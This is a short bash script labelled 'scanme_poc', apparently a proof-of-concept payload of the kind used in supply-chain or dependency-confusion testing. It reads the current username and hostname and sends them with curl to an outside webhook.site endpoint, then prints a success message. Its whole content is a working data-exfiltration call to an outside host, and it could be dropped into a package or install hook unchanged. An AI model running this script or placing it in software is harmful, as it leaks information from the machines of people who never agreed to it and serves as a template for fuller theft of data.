#!/bin/bash
# scanme_poc
MY_USER=$(whoami)
MY_HOST=$(hostname)
curl -X POST -d "user=$MY_USER&host=$MY_HOST&tag=scanme_poc" https://webhook.site/3a532602-8d00-44bd-96ad-5bf6db14c079
echo "PoC Executed Successfully"
